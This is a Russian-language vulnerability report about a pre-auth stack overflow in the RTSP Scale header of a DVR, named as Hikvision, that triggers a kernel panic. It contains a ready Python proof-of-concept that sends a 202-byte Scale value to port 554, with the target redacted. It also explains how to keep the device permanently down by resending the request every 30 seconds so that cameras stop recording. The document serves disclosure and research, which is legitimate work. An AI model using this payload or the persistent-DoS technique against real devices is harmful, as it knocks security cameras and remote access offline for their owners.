# [SC] RTSP Scale Header — Kernel Panic

**CWE-121** · **CVSS 8.1 High** · **Pre-auth** · **Remote** · **Full Device Reboot**

---

## Краткое описание

Заголовок `Scale` в RTSP-запросе `PLAY` обрабатывается без проверки длины. При подаче ~200+ байт устройство уходит в **kernel panic** — полная перезагрузка, недоступность всех сервисов на >90 секунд. Это деструктивный вектор: в отличие от [UA] и [TR], watchdog недостаточно быстр для компенсации.

---

## Технические детали

### Уязвимое поле

```
Scale: <OVERFLOW_HERE>
```

В RTSP `Scale` обозначает скорость воспроизведения (1.0 = нормальная). Парсер копирует значение в буфер стека без проверки.

### Тип краша

Kernel panic (не просто crash процесса). Сигнатура:
- Recovery time **>90 секунд** (системная перезагрузка)
- Все сервисы (RTSP :554, HTTP :80) недоступны до завершения ребута
- Watchdog сам по себе не справляется — нужен полный reboot цикл

### Порог

| Длина Scale | Recovery | Тип |
|------------|----------|-----|
| < 128 байт | Нет краша | Норма |
| ~200 байт | >90 сек | **Kernel panic** |
| `b'1.' + b'1'*200` | ~110–150 сек | Full reboot |

---

## Доказательство (PoC)

```python
import socket

TARGET = "█████████████"
scale = b'1.' + b'1' * 200    # 202 байта → kernel panic
req = (b"PLAY rtsp://█████████████:554/live RTSP/1.0\r\n"
       b"CSeq: 3\r\n"
       b"Session: 1234567890\r\n"
       b"Scale: " + scale + b"\r\n\r\n")

s = socket.socket(); s.settimeout(5)
s.connect((TARGET, 554)); s.sendall(req); s.close()
# → kernel panic → полная перезагрузка устройства (~90–150 сек)
```

## Операционное воздействие

Это эффективный **постоянный DoS**: атакующий может посылать запрос раз в 30 секунд, не давая устройству завершить reboot. Камеры перестают записывать, удалённый доступ недоступен.

## Нет аналогов в CVE

Поиск по NVD, cvedetails, Rapid7 DB: ни один CVE не описывает overflow через `Scale` заголовок на Hikvision DVR.
